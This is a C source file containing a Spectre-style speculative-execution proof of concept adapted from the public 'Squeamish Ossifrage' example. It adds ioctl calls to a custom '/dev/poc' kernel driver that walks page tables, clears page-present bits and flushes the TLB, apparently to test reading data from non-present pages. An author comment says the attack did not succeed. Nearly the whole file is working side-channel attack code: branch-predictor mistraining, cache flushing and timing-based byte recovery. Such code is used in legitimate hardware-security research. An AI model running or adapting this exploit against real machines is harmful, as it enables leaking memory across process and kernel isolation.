#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#include <sys/mman.h>
#include <malloc.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <fcntl.h>
#endif


/*
* I have not attack sucess, i give up 
*/
/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif


#define DEVNAME "/dev/poc"
#define IOCTL_CMD_PAGE_TABLE_WALK (0x100)
#define IOCTL_CMD_CLEAR_PAGE_PRESENT (0x200)
#define IOCTL_CMD_GET_PTE_OR_PDE_VALUE (0x300)
#define IOCTL_CMD_FLUSH_TLB_ONE (0x400)
#define IOCTL_CMD_SET_PAGE_PRESENT (0x500)
struct POC_ARG
{	
	unsigned long kerl_user_flag; //0 kernel va address; 1 user va address
	unsigned long out_kerl_va;
	unsigned long out_kerl_pa;
	unsigned long out_kerl_va_pte_va;
	unsigned long out_kerl_va_pte_value;
	unsigned long in_user_va;
	unsigned long out_user_pa;
	unsigned long out_user_va_pte_va;
	unsigned long out_user_va_pte_value;
};
struct POC_ARG g_pocarg;
int g_dfd;
/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char* secret = "The Magic Words are Squeamish Ossifrage.";
static char* g_buffer;
int pagesize;
unsigned long use_user_or_kernel_va = 0;
uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
unsigned char temmp;


void pipeline_flush(void)
{
	__asm__ __volatile__("mov $0, %%eax\n\tcpuid" : /*out*/ : /*in*/ : "rax","rbx","rcx","rdx","memory");
}

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (100) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;
	
	for (i = 0; i < 256; i++)
		results[i] = 0;
	
	for (tries = 9; tries > 0; tries--) //999
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)  //29
		{
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));
			
			
			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			pipeline_flush();
			time1 = __rdtscp(&junk); /* READ TIMER */
			pipeline_flush();
			junk = *addr; /* MEMORY ACCESS TO TIME */
			pipeline_flush();
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			printf("mix_i is %d , time2 is %ld \n", mix_i, time2);
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char* * argv)
{
	
	g_dfd = open(DEVNAME, O_RDWR);
	if(g_dfd < 0)
	{
		printf("poc driver is no load\n");
		return -1;
	}
	size_t malicious_x;
	int score[2], len = 1;
	uint8_t value[2];
	use_user_or_kernel_va = 1;
	g_pocarg.kerl_user_flag = use_user_or_kernel_va;
	if(g_pocarg.kerl_user_flag == 0)
	{
		printf("use kernel va \n");
		ioctl(g_dfd, IOCTL_CMD_PAGE_TABLE_WALK, &g_pocarg);
		printf("va is 0x%lx\n", g_pocarg.out_kerl_va);
		printf("pa is 0x%lx\n", g_pocarg.out_kerl_pa);
		printf("pte va is 0x%lx\n", g_pocarg.out_kerl_va_pte_va);
		printf("pte entry value is 0x%lx\n", g_pocarg.out_kerl_va_pte_value);
		*((char*)g_pocarg.out_kerl_va) = 'A';
		_mm_mfence();
		printf("Putting %c, ascii %d, 0x%x, in address %p\n", *((char*)g_pocarg.out_kerl_va),*((char*)g_pocarg.out_kerl_va), g_buffer[0],(void *)((char*)g_pocarg.out_kerl_va));
		malicious_x = (size_t)((char *)g_pocarg.out_kerl_va - (char *)array1);
		ioctl(g_dfd, IOCTL_CMD_CLEAR_PAGE_PRESENT, &g_pocarg);
	}
	else if(g_pocarg.kerl_user_flag == 1)
	{
		printf("use user va \n");
		pagesize = sysconf(_SC_PAGE_SIZE);
    	if (pagesize == -1) printf("get page size fail\n");
		g_buffer = memalign(pagesize, 1 * pagesize);
    	if (g_buffer == NULL) printf("memalign is fail\n");
		g_buffer[0] = 'A';
		_mm_mfence();
		printf("Putting %c, ascii %d, 0x%x, in address %p\n", g_buffer[0], g_buffer[0], g_buffer[0],(void *)(&g_buffer[0]));
		malicious_x = (size_t)(&g_buffer[0] - (char *)array1); 
		g_pocarg.in_user_va = (unsigned long)&g_buffer[0];
		ioctl(g_dfd, IOCTL_CMD_PAGE_TABLE_WALK, &g_pocarg);
		/*
		if(mprotect((char *)g_pocarg.in_user_va, 1*pagesize, PROT_NONE) != 0)
		{
			printf("mprotect is fail\n");
		}
		*/
		ioctl(g_dfd, IOCTL_CMD_FLUSH_TLB_ONE, &g_pocarg);
		ioctl(g_dfd, IOCTL_CMD_CLEAR_PAGE_PRESENT, &g_pocarg);
		//ioctl(g_dfd, IOCTL_CMD_SET_PAGE_PRESENT, &g_pocarg);
		//g_buffer[0] = 'A'; //read can auto page table walk and generate tlb
		//ioctl(g_dfd, IOCTL_CMD_FLUSH_TLB_ONE, &g_pocarg);
		//ioctl(g_dfd, IOCTL_CMD_CLEAR_PAGE_PRESENT, &g_pocarg);
		//g_buffer[0] = 'A';
		
	}
	else
	{
		printf("invalid va");
	}

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	
	while (--len >= 0)
	{
		printf("Reading at malicious_x = %p : ", (void *)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   score[1]);
		printf("\n");
	}
#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	ioctl(g_dfd, IOCTL_CMD_GET_PTE_OR_PDE_VALUE, &g_pocarg);
	close(g_dfd);	
	return (0);
}
